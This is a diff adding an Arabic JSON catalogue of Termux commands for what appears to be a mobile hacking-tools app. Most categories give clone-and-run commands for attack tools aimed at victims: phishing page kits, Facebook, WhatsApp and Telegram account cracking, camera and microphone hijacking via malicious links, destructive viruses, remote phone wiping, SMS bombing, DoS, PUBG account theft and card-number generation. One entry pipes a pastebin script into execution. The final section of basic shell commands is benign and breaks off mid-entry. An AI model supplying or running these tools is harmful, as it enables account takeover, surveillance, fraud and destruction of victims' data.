@@ -1,0 +1,1250 @@
+[
+  {
+    "id": "tool_essentials",
+    "name": "🛠️ أساسيات تريمكس",
+    "commands": [
+      {
+        "id": "cmd_install_all",
+        "name": "تثبيت جميع الأساسيات",
+        "description": "أمر واحد متكامل لتثبيت كل ما تحتاجه في تريمكس (python, git, php, curl, nano, wget, وغيرها الكثير)",
+        "syntax": "termux-setup-storage;cd;dpkg --configure -a;pkg update -y;pkg upgrade -y;pkg install python -y;pkg install python2 -y;pkg install python3 -y;pkg install git -y;pkg install php -y;pkg install curl -y;pkg install wget -y;pkg install nano -y;pkg install zip -y;pkg install unzip -y;pkg install tar -y;pkg install openssh -y;apt update && apt upgrade -y",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_fix_errors",
+        "name": "تصحيح أخطاء الأوامر",
+        "description": "أداة لتصحيح الأخطاء أثناء كتابة الأوامر في تريمكس",
+        "syntax": "pkg update && pkg upgrade\npkg install fish",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_fake_root",
+        "name": "صلاحيات روت وهمي",
+        "description": "تمنح هاتفك صلاحيات روت وهمية لتشغيل التطبيقات التي تحتاج إلى روت",
+        "syntax": "apt update\napt upgrade\napt install git curl\npkg install python2\ngit clone https://github.com/Gameye98/Lazymux\ncd Lazymux\nchmod +x lazymux.py\npython2 lazymux.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_install_java",
+        "name": "تثبيت لغة جافا",
+        "description": "تثبيت لغة الجافا على Termux بدون الحاجة إلى صلاحيات روت",
+        "syntax": "pkg install git\ngit clone https://github.com/Hax4us/java\ncd java\nchmod 777 installjava\nbash installjava\ny",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_wifi_hacking",
+    "name": "🌐 اختراق واي فاي",
+    "commands": [
+      {
+        "id": "cmd_wifite2",
+        "name": "Wifite2 - اختراق الشبكات",
+        "description": "أداة قوية لاختراق شبكات الواي فاي، تحدد الأهداف وتلتقط كلمات المرور تلقائياً",
+        "syntax": "git clone https://github.com/derv82/wifite2.git\ncd wifite2\nsudo ./Wifite.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_wifi_lazy",
+        "name": "اختراق واي فاي (طريقة سهلة)",
+        "description": "أداة شاملة لاختراق الواي فاي مع واجهة مبسطة",
+        "syntax": "apt update\napt upgrade\npkg install python2\npkg install git\ngit clone https://github.com/TechnicalMujeeb/Termux-Lazyscript.git\ncd Termux-Lazyscript\nchmod +x *\nsh setup.sh\npython2 ls.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_phishing",
+    "name": "🎭 التصيد الاحتيالي",
+    "commands": [
+      {
+        "id": "cmd_socialphish",
+        "name": "SocialPhish - صفحات مزيفة",
+        "description": "أداة تصيد احتيالي تحتوي على 32 قالباً جاهزاً لإنشاء صفحات مزيفة (فيسبوك، جوجل، انستقرام)",
+        "syntax": "apt update -y\napt upgrade -y\npkg install git -y\ngit clone https://github.com/xHak9x/SocialPhish.git\ncd SocialPhish\nchmod +x socialphish.sh\n./socialphish.sh",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_shellphish",
+        "name": "ShellPhish - قوالب متعددة",
+        "description": "أداة لإنشاء صفحات مزورة لفيسبوك وجوجل وانستا مع خيارات نفق متعددة",
+        "syntax": "apt update && apt upgrade -y\napt install git wget php openssh -y\ngit clone https://github.com/thelinuxchoice/shellphish\ncd shellphish\nbash shellphish.sh",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rubikphish",
+        "name": "RubikPhish - تصيد آلي",
+        "description": "أداة تصيد آلية مع أكثر من 30 نموذجاً محدثاً وخيارات أنفاق متعددة",
+        "syntax": "apt update\napt upgrade\npkg install git -y\ngit clone https://github.com/rubikproxy/rubikphish\ncd rubikphish\nchmod +x rubikphish.sh\nbash rubikphish.sh",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_asura",
+        "name": "Asura - أداة تصيد متقدمة",
+        "description": "أداة تصيد آلي مع أكثر من 30 نموذجاً وتحديثات مستمرة",
+        "syntax": "pkg update & pkg upgrade\npkg install git -y\ngit clone https://github.com/princekrvert/Asura.git\ncd Asura\nchmod +x *\n./install.sh",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_facebook",
+    "name": "📘 أدوات فيسبوك",
+    "commands": [
+      {
+        "id": "cmd_firecrack",
+        "name": "Firecrack - اختراق فيسبوك",
+        "description": "أداة للهجوم العشوائي على حسابات فيسبوك",
+        "syntax": "pkg install python2\npkg install git\ngit clone https://github.com/Ranginang67/Firecrack\ncd Firecrack\npip2 install -r requirements.txt\npython2 firecrack.py",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_fb_brute",
+        "name": "FB-Brute - تخمين كلمة المرور",
+        "description": "هجوم على كلمة مرور فيسبوك باستخدام ملف كلمات مرور خارجي",
+        "syntax": "termux-setup-storage\npkg update\npkg upgrade\npkg install python\npkg install git\npkg install ruby\ngem install lolcat\ngit clone https://github.com/STLP-TEAM/FB-Brute\npip install requests\npip install mechanize\ncd FB-Brute\npython brute.py\n# كلمة المرور: TEAM STLP",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_fbh_tool",
+        "name": "FBH - أداة تخمين",
+        "description": "أداة متخصصة في تخمين كلمات مرور فيسبوك",
+        "syntax": "apt update && apt upgrade\napt install git\npkg install ruby\ngem install lolcat\npip2 install requests\npip2 install mechanize\ngit clone https://github.com/muhammadfathul/FBH\ncd FBH\nchmod +x *\nbash setup\nbash .FBH\n# Username: AsecC\n# Password: eror404",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_report_remove",
+        "name": "إزالة حساب فيسبوك",
+        "description": "أداة لإزالة حساب فيسبوك عن طريق التقرير التلقائي",
+        "syntax": "apt update && apt upgrade\napt install python\napt install git\ngit clone https://github.com/IlayTamvan/Report\ncd Report\nunzip Report.zip\npython2 Report.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_whatsapp_telegram",
+    "name": "💬 واتساب وتليجرام",
+    "commands": [
+      {
+        "id": "cmd_hxwhatsapp",
+        "name": "HxWhatsApp - تخمين واتساب",
+        "description": "اختراق واتساب عن طريق التخمين (نسبة نجاح تصل إلى 50%)",
+        "syntax": "pkg update && pkg upgrade\npkg install python\npkg install python2\npkg install git\ngit clone https://github.com/Bl4ckDr460n/HxWhatsApp\ncd HxWhatsApp\npython2 HxWhatsApp.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_wa_crasher",
+        "name": "WA CRASHER - تعطيل التطبيق",
+        "description": "رموز تعطل واتساب وتليجرام وانستقرام عند إرسالها عبر الرسائل",
+        "syntax": "apt update && apt upgrade -y\npkg install python git -y\npip install colorama\ngit clone https://github.com/XPH4N70M/WA_CRASHER\ncd WA_CRASHER\npython3 WA_CRASHER.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_telegram_hack",
+        "name": "اختراق تليجرام",
+        "description": "أداة لاختراق حسابات تليجرام (تجاوز التوثيق الثنائي)",
+        "syntax": "apt update\napt upgrade\npkg install git\npkg install python\npkg install python2\npkg install php\ngit clone https://github.com/Master-Bruno/Hack-Telegram\ncd Hack-Telegram\npip3 install telethon\npip3 install telegram\npython telegram-hack.py",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_tracking",
+    "name": "📍 تتبع وجمع معلومات",
+    "commands": [
+      {
+        "id": "cmd_trace_number",
+        "name": "تتبع رقم الهاتف",
+        "description": "تتبع أي رقم هاتف والحصول على معلومات عنه",
+        "syntax": "apt update\napt install git\napt install python\napt install python3\ngit clone https://github.com/BlackFoxTM/trace_num\ncd trace_num\npip3 install -r requirements.txt\npython3 main.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_ipdrone",
+        "name": "IPdrone - تتبع IP",
+        "description": "البحث عن بروتوكول الإنترنت والحصول على معلومات الموقع بدقة عالية",
+        "syntax": "apt-get update -y\napt-get upgrade -y\npkg install python -y\npkg install git -y\npip install lolcat\npip install requests\ngit clone https://github.com/noob-hackers/ipdrone\ncd ipdrone\npython ipdrone.py -v [IP_ADDRESS]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_ipfy",
+        "name": "IP-FY - تحديد موقع الضحية",
+        "description": "تحديد موقع الضحية بشكل دقيق جداً من خلال عنوان IP",
+        "syntax": "apt install python\ngit clone https://github.com/T4P4N/IP-FY\npip install requests\ncd IP-FY\npython ipfy.py -t",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_cameras",
+    "name": "📷 كاميرات وتسجيل",
+    "commands": [
+      {
+        "id": "cmd_cam_hackers",
+        "name": "كاميرات IP العالمية",
+        "description": "عرض كاميرات IP في جميع أنحاء العالم (كاميرات مراقبة)",
+        "syntax": "apt-get install python3\napt-get install git\ngit clone https://github.com/AngelSecurityTeam/Cam-Hackers\npip3 install requests\ncd Cam-Hackers\npython3 cam-hackers.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_camera_hack",
+        "name": "اختراق الكاميرا الأمامية",
+        "description": "اختراق كاميرا الهاتف المستهدف عبر رابط ملغم",
+        "syntax": "pkg install git php\ngit clone https://github.com/OnlineHacKing/CameraHack\ncd CameraHack\nbash setup\nbash CamHack",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_aliens_camera",
+        "name": "ALIENS كاميرا - رابط ملغم",
+        "description": "اختراق الكاميرا الأمامية عبر رابط ملغم فعال لمدة 24 ساعة",
+        "syntax": "apt update && apt upgrade -y\napt install git -y\napt install php -y\ntermux-setup-storage\ncd /sdcard\ngit clone https://github.com/hackermohamedPro/ALIENS.HaCK.Camera\ncd ALIENS.HaCK.Camera\nbash alienshack.sh",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_sayhello",
+        "name": "تسجيل الصوت عن بعد",
+        "description": "تسجيل صوت الضحية وفتح المايك عن بعد",
+        "syntax": "pkg update\npkg install openssh\npkg install php\npkg install git\ngit clone https://github.com/thelinuxchoice/sayhello\ncd sayhello\nbash sayhello.sh",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_viruses",
+    "name": "💣 فيروسات وتدمير",
+    "commands": [
+      {
+        "id": "cmd_selfkiller",
+        "name": "Selfkiller - فيروس مدمر",
+        "description": "إنشاء فيروس يدمر الهاتف المستهدف بالكامل",
+        "syntax": "apt install git\napt install python\ngit clone https://github.com/GH05T-HUNTER5/selfkiller\ncd selfkiller\nbash selfkiller.sh",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_matermuxx",
+        "name": "Matermuxx - 60 نوع فيروس",
+        "description": "إنشاء فيروسات مدمرة للأندرويد والويندوز (أكثر من 60 نوعاً مختلفاً)",
+        "syntax": "apt update\napt upgrade\napt install python2\napt install git\ngit clone https://github.com/Hider5/Matermuxx\npip2 install -r requirements.txt\nchmod 777 malicious.py\npython2 malicious.py",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_format_hack",
+        "name": "فرمته الهاتف عن بعد",
+        "description": "أداة لفرمته هاتف الضحية وتدمير جميع بياناته (استخدم بحذر شديد)",
+        "syntax": "pkg install git\npkg install bash\ngit clone https://github.com/yehia-hacker/new\ncd new\nbash 10100.sh",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_instagram",
+    "name": "📸 أدوات انستقرام",
+    "commands": [
+      {
+        "id": "cmd_inshackle",
+        "name": "Inshackle - زيادة متابعين",
+        "description": "تزويد متابعين حقيقيين في انستقرام (انتظر 10 دقائق بعد التشغيل)",
+        "syntax": "pkg install git\npkg install openssl-tool\npkg install curl\npkg install wget\ngit clone https://github.com/thelinuxchoice/inshackle.git\ncd inshackle\nbash inshackle.sh\n# اختر الرقم 2 ثم اكتب ايميل وباسورد حسابك",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_osi_ig",
+        "name": "جمع معلومات انستقرام",
+        "description": "جمع معلومات تفصيلية من أي حساب انستقرام",
+        "syntax": "pkg install -y git\ngit clone https://github.com/th3unkn0n/osi.ig.git\ncd osi.ig\npython3 -m pip install -r requirements.txt\npython3 main.py -u [username]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_web_hacking",
+    "name": "🌐 اختراق مواقع ويب",
+    "commands": [
+      {
+        "id": "cmd_commix",
+        "name": "Commix - حقن المواقع",
+        "description": "أداة متقدمة لحقن المواقع المصابة بثغرة الحقن",
+        "syntax": "pkg update\npkg upgrade\npkg install git\npkg install python2\ngit clone https://github.com/commixproject/commix\ncd commix\nchmod +x *\npython2 commix.py\npython2 commix.py -u [URL]",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_blazy",
+        "name": "Blazy - اختراق المواقع",
+        "description": "اختراق المواقع المصابة بثغرة bypass",
+        "syntax": "git clone https://github.com/UltimateHackers/Blazy\ncd Blazy\npip install -r requirements.txt\npython2 blazy.py",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_sms_bomber",
+    "name": "💣 قنابل رسائل",
+    "commands": [
+      {
+        "id": "cmd_oh_sms",
+        "name": "قنبلة رسائل SMS",
+        "description": "إرسال رسائل مزعجة SMS إلى الرقم المستهدف",
+        "syntax": "pkg install python3-pip3\ngit clone https://github.com/OnlineHacKing/OH-SMSbomber.git\ncd OH-SMSbomber\npip3 install -r requirements.txt\npython3 OHbomber.py [رقم_الهاتف]",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tbomb",
+        "name": "TBomb - قاذف رسائل",
+        "description": "إرسال كميات كبيرة من الرسائل المزعجة",
+        "syntax": "apt update && apt upgrade\npkg install git\npkg install python2\npkg install bash\ngit clone https://github.com/TheSpeedX/TBomb\ncd TBomb\nbash TBomb.sh",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_multi_tools",
+    "name": "🧰 مجموعات أدوات متكاملة",
+    "commands": [
+      {
+        "id": "cmd_darkfly",
+        "name": "DarkFly - 500 أداة",
+        "description": "تثبيت أكثر من 500 أداة مختلفة في تريمكس",
+        "syntax": "pkg update && pkg upgrade\npkg install git\npkg install python2\ngit clone https://github.com/Ranginang67/DarkFly-Tool\ncd DarkFly-Tool\npython2 install.py\nDarkFly",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_fsociety",
+        "name": "Fsociety - مجموعة Mr.Robot",
+        "description": "مجموعة أدوات اختبار الاختراق المستخدمة في مسلسل Mr.Robot",
+        "syntax": "git clone https://github.com/Manisso/fsociety.git\ncd fsociety\nchmod +x install.sh\n./install.sh\nfsociety",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_hacking_lab",
+        "name": "مختبر اختراق متكامل",
+        "description": "إعداد مختبر قرصنة متكامل على تريمكس",
+        "syntax": "apt update && apt upgrade -y\npkg install git -y\npkg install python3 -y\ngit clone https://github.com/GManOfficial/Termux_HackingLab_Setup.git\ncd Termux_HackingLab_Setup\npython3 install.py",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_passwords",
+    "name": "🔐 كلمات مرور وفيزات",
+    "commands": [
+      {
+        "id": "cmd_pgen",
+        "name": "P-Gen - كلمة مرور عشوائية",
+        "description": "إنشاء كلمة مرور عشوائية وتشفير للأدوات",
+        "syntax": "apt-get update -y\napt-get upgrade -y\npkg install python -y\npkg install git -y\npip install requests\ngit clone https://github.com/noob-hackers/p-gen\ncd p-gen\npython p-gen.py",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_card_number",
+        "name": "استخراج فيزات عشوائية",
+        "description": "استخراج أرقام فيزات عشوائية صالحة",
+        "syntax": "apt update\napt upgrade\napt install git\ngit clone https://github.com/INDOnimous/Card-Number\ncd Card-Number\nchmod +x *\nsh Card.sh",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_metasploit",
+    "name": "🎯 ميتاسبلويت",
+    "commands": [
+      {
+        "id": "cmd_metasploit_install",
+        "name": "تثبيت Metasploit",
+        "description": "تثبيت أداة ميتاسبلويت على ترمكس (الطريقة المباشرة والناجحة)",
+        "syntax": "apt update && apt upgrade -y\napt install python\napt install git\ngit clone https://github.com/verluchie/termux-metasploit.git\ncd termux-metasploit\nchmod 777 install.sh\nsh install.sh\nmsfconsole",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_dos_attacks",
+    "name": "💥 هجمات DoS",
+    "commands": [
+      {
+        "id": "cmd_hammer",
+        "name": "Hammer - تدمير البوردة",
+        "description": "هجوم لتدمير بوردة الجهاز المستهدف من خلال عنوان IP",
+        "syntax": "apt update && apt upgrade -y\npkg install python\npkg install python3\npkg install git\ngit clone https://github.com/cyweb/hammer\ncd hammer\npython3 hammer.py -s [IP] -p 80 -t 135",
+        "difficulty": "متقدم",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_pubg",
+    "name": "🎮 ببجي",
+    "commands": [
+      {
+        "id": "cmd_pubg_hack",
+        "name": "سرقة حسابات ببجي",
+        "description": "أداة لسرقة حسابات ببجي موبايل",
+        "syntax": "pkg install python2 curl wget git -y\ngit clone https://githup.com/pirmansx/mbf\ncd mbf\nchmod +× MBF.py\npip2 install mechanize",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_downloader",
+    "name": "📥 تحميل وسائط",
+    "commands": [
+      {
+        "id": "cmd_youtube_dl",
+        "name": "تحميل فيديوهات يوتيوب",
+        "description": "تحميل فيديوهات من اليوتيوب مباشرة بدون تطبيقات خارجية",
+        "syntax": "apt update\napt upgrade\npkg install wget\nwget http://pastebin.com/raw/W1nvzN6q -O install.sh\nchmod 777 install.sh\n./install.sh",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      }
+    ]
+  },
+  {
+    "id": "tool_image_payload",
+    "name": "🖼️ حقن الصور 🖼️",
+    "commands": [
+      {
+        "id": "cmd_pixload",
+        "name": "Pixload - حقن بايلود في صورة",
+        "description": "حقن بايلود خبيث في صور (يدعم BMP, GIF, JPG, PNG, WebP)",
+        "syntax": "git clone https://github.com/chinarulezzz/pixload\nsudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl",
+        "difficulty": "متقدم",
+        "usageCount": 1
+      }
+    ]
+  },
+  {
+    "id": "tool_termux_basics",
+    "name": "📟 أوامر Termux الأساسية",
+    "commands": [
+      {
+        "id": "cmd_ls",
+        "name": "ls - عرض الملفات والمجلدات",
+        "description": "يعرض جميع الملفات والمجلدات في المسار الحالي",
+        "syntax": "ls\nls -la\nls -lh\nls -R",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cd",
+        "name": "cd - التنقل بين المجلدات",
+        "description": "يتنقل بين المجلدات (يدخل إلى مجلد أو يخرج منه)",
+        "syntax": "cd [اسم المجلد]     # للدخول إلى مجلد\ncd ..                # للخروج مجلد واحد\ncd ../..             # للخروج مجلدين\ncd ~                 # للانتقال إلى المجلد الرئيسي\ncd /sdcard           # للانتقال إلى التخزين الداخلي",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pwd",
+        "name": "pwd - معرفة المسار الحالي",
+        "description": "يعرض المسار الكامل للمجلد الذي أنت فيه حالياً",
+        "syntax": "pwd",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_mkdir",
+        "name": "mkdir - إنشاء مجلد جديد",
+        "description": "ينشئ مجلداً جديداً بالاسم الذي تحدده",
+        "syntax": "mkdir [اسم المجلد]\nmkdir -p [اسم المجلد/مجلد داخلي]  # لإنشاء مجلدات متداخلة",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rmdir",
+        "name": "rmdir - حذف مجلد فارغ",
+        "description": "يحذف مجلداً فارغاً فقط (لا يمكن حذف مجلد يحتوي على ملفات)",
+        "syntax": "rmdir [اسم المجلد]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_rm",
+        "name": "rm - حذف ملفات أو مجلدات",
+        "description": "يحذف الملفات أو المجلدات (استخدم بحذر، الحذف نهائي)",
+        "syntax": "rm [اسم الملف]           # حذف ملف\nrm -r [اسم المجلد]        # حذف مجلد ومحتوياته\nrm -rf [اسم المجلد]       # حذف قسري (خطير جداً)\nrm *.txt                  # حذف كل ملفات txt",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cp",
+        "name": "cp - نسخ ملفات أو مجلدات",
+        "description": "ينسخ الملفات أو المجلدات من مكان إلى آخر",
+        "syntax": "cp [الملف الأصلي] [الوجهة]\ncp -r [المجلد الأصلي] [الوجهة]   # نسخ مجلد كامل",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_mv",
+        "name": "mv - نقل أو إعادة تسمية",
+        "description": "ينقل الملفات أو المجلدات، أو يعيد تسميتها",
+        "syntax": "mv [الملف القديم] [الملف الجديد]   # إعادة تسمية\nmv [الملف] [المجلد/]                  # نقل ملف إلى مجلد",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_touch",
+        "name": "touch - إنشاء ملف فارغ",
+        "description": "ينشئ ملفاً جديداً فارغاً، أو يحدث تاريخ آخر تعديل لملف موجود",
+        "syntax": "touch [اسم الملف]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_cat",
+        "name": "cat - عرض محتوى الملف",
+        "description": "يعرض محتوى الملف النصي بالكامل في الشاشة",
+        "syntax": "cat [اسم الملف]\ncat file1.txt file2.txt    # عرض عدة ملفات\ncat > file.txt            # إنشاء ملف وكتابة فيه",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_echo",
+        "name": "echo - طباعة نص",
+        "description": "يطبع نصاً على الشاشة، أو يكتبه في ملف",
+        "syntax": "echo [النص]\necho [النص] > file.txt    # كتابة في ملف\necho [النص] >> file.txt   # إضافة إلى ملف",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_nano",
+        "name": "nano - محرر نصوص",
+        "description": "يفتح محرر نصوص بسيط لتحرير الملفات",
+        "syntax": "nano [اسم الملف]\n# Ctrl + X للخروج، Y للحفظ، N للخروج بدون حفظ",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_vim",
+        "name": "vim - محرر نصوص متقدم",
+        "description": "محرر نصوص قوي، يحتاج إلى تعلم أوامره الأساسية",
+        "syntax": "vim [اسم الملف]\n# i للدخول في وضع الكتابة، ESC للخروج، :wq للحفظ والخروج",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tree",
+        "name": "tree - عرض هيكل المجلدات",
+        "description": "يعرض هيكل المجلدات والملفات بشكل شجري جميل",
+        "syntax": "tree                      # عرض الهيكل الكامل\ntree -L 2                 # عرض مستويين فقط\ntree -d                   # عرض المجلدات فقط\ntree -L 3 -d              # عرض 3 مستويات من المجلدات فقط",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_clear",
+        "name": "clear - مسح الشاشة",
+        "description": "يمسح كل ما على الشاشة لتبدأ بصفحة نظيفة",
+        "syntax": "clear\n# اختصار Ctrl + L",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_history",
+        "name": "history - سجل الأوامر",
+        "description": "يعرض قائمة بجميع الأوامر التي كتبتها سابقاً",
+        "syntax": "history\nhistory | grep [كلمة]    # البحث في السجل\n!123                      # تنفيذ الأمر رقم 123",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_whoami",
+        "name": "whoami - معرفة المستخدم الحالي",
+        "description": "يعرض اسم المستخدم الذي تعمل به حالياً",
+        "syntax": "whoami",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_chmod",
+        "name": "chmod - تغيير صلاحيات الملف",
+        "description": "يغير صلاحيات القراءة والكتابة والتنفيذ للملفات",
+        "syntax": "chmod +x [اسم الملف]        # جعل الملف قابلاً للتنفيذ\nchmod 777 [اسم الملف]        # صلاحيات كاملة (خطير)\nchmod 755 [اسم الملف]        # صلاحيات آمنة",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_grep",
+        "name": "grep - البحث داخل الملفات",
+        "description": "يبحث عن نص معين داخل ملف أو مخرجات أمر",
+        "syntax": "grep [كلمة] [اسم الملف]\nls | grep [كلمة]            # بحث في مخرجات ls\ngrep -r [كلمة] [مجلد]       # بحث في كل الملفات داخل مجلد",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_find",
+        "name": "find - البحث عن ملفات",
+        "description": "يبحث عن ملفات ومجلدات حسب الاسم أو النوع أو الحجم",
+        "syntax": "find [مجلد] -name [اسم الملف]\nfind . -name \"*.txt\"         # بحث عن كل ملفات txt\nfind . -type d               # بحث عن مجلدات فقط",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_zip_unzip",
+        "name": "zip / unzip - ضغط وفك ضغط",
+        "description": "يضغط أو يفك ضغط الملفات بصيغة ZIP",
+        "syntax": "zip [ملف مضغوط.zip] [ملف/مجلد]   # ضغط\nunzip [ملف مضغوط.zip]               # فك ضغط\nunzip [ملف.zip] -d [مجلد]           # فك ضغط في مجلد معين",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_tar",
+        "name": "tar - ضغط بصيغة tar",
+        "description": "يضغط أو يفك ضغط الملفات بصيغة tar (شائعة في لينكس)",
+        "syntax": "tar -cvf [ملف.tar] [مجلد]       # إنشاء ملف tar\ntar -xvf [ملف.tar]                # فك ضغط tar\ntar -czvf [ملف.tar.gz] [مجلد]    # ضغط مع ضغط gzip",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_wget",
+        "name": "wget - تحميل من الإنترنت",
+        "description": "يقوم بتحميل ملفات من الإنترنت عبر رابط مباشر",
+        "syntax": "wget [رابط الملف]\nwget -O [اسم جديد] [رابط]      # تحميل باسم مختلف\nwget -c [رابط]                # استكمال تحميل متقطع",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_curl",
+        "name": "curl - نقل بيانات من الإنترنت",
+        "description": "أداة قوية لنقل البيانات من وإلى الإنترنت (API، تحميل، رفع)",
+        "syntax": "curl [رابط]\ncurl -O [رابط]               # تحميل ملف\ncurl -X POST [رابط] -d [بيانات]  # إرسال بيانات",
+        "difficulty": "متوسط",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_pkg",
+        "name": "pkg - إدارة الحزم في Termux",
+        "description": "الأمر الرئيسي لتثبيت وتحديث وإلغاء تثبيت الحزم في Termux",
+        "syntax": "pkg update                   # تحديث قائمة الحزم\npkg upgrade                  # ترقية جميع الحزم\npkg install [اسم الحزمة]     # تثبيت حزمة\npkg uninstall [اسم الحزمة]   # إلغاء تثبيت حزمة\npkg list-all                 # عرض كل الحزم المتاحة\npkg list-installed           # عرض الحزم المثبتة\npkg search [كلمة]            # البحث عن حزمة",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_apt",
+        "name": "apt - مدير الحزم البديل",
+        "description": "مدير حزم بديل لـ pkg (يعمل بنفس الطريقة)",
+        "syntax": "apt update\napt upgrade\napt install [اسم الحزمة]\napt remove [اسم الحزمة]",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_python",
+        "name": "python - تشغيل بايثون",
+        "description": "يفتح بيئة بايثون أو يشغل ملفات .py",
+        "syntax": "python                     # فتح بيئة بايثون\npython [ملف.py]            # تشغيل ملف بايثون\npython2 [ملف.py]           # استخدام بايثون 2\npip install [مكتبة]        # تثبيت مكتبة بايثون",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_git",
+        "name": "git - تحميل المشاريع من GitHub",
+        "description": "يستخدم لتحميل المشاريع والأدوات من GitHub",
+        "syntax": "git clone [رابط المشروع]\ngit clone https://github.com/username/repo.git\ncd [اسم المشروع]\nls",
+        "difficulty": "مبتدئ",
+        "usageCount": 0
+      },
+      {
+        "id": "cmd_ssh",
+        "name": "ssh - اتصال آمن بجهاز آخر",
+        "description": "يتصل بخادم أو جهاز آخر عن بعد بشكل آمن",
